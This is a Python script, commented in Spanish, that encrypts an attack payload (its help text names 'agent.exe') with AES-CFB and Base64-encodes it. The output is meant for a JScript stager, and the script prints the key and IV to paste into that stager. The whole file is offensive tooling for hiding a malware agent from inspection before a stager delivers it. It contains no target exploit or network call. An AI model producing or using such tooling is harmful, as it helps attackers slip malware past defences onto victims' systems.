#!/usr/bin/env python3
"""
Cifrar payload con AES-CFB para JScript stager
"""

import sys
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_payload(input_file, output_file, key, iv):
    """Cifrar archivo con AES-CFB"""
    
    # Leer payload
    with open(input_file, 'rb') as f:
        plaintext = f.read()
    
    print(f"[*] Payload: {len(plaintext)} bytes")
    
    # Cifrar con AES-CFB
    key_bytes = key.encode('utf-8').ljust(16, b'\0')[:16]
    iv_bytes = iv.encode('utf-8').ljust(16, b'\0')[:16]
    
    cipher = AES.new(key_bytes, AES.MODE_CFB, iv_bytes, segment_size=128)
    ciphertext = cipher.encrypt(plaintext)
    
    # Codificar en Base64
    encrypted_b64 = base64.b64encode(ciphertext).decode('ascii')
    
    print(f"[*] Cifrado: {len(encrypted_b64)} caracteres Base64")
    
    # Guardar
    with open(output_file, 'w') as f:
        f.write(encrypted_b64)
    
    print(f"[+] Payload cifrado guardado: {output_file}")
    print(f"\n[!] IMPORTANTE: Usa esta configuración en el stager:")
    print(f"    AES_KEY = \"{key}\"")
    print(f"    AES_IV = \"{iv}\"")

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Cifrar payload para JScript stager')
    parser.add_argument('--input', required=True, help='Payload a cifrar (agent.exe)')
    parser.add_argument('--output', default='payload.enc', help='Archivo cifrado de salida')
    parser.add_argument('--key', default='MySecretKey12345', help='Clave AES (16 chars)')
    parser.add_argument('--iv', default='MySecretIV123456', help='IV AES (16 chars)')
    
    args = parser.parse_args()
    
    try:
        encrypt_payload(args.input, args.output, args.key, args.iv)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
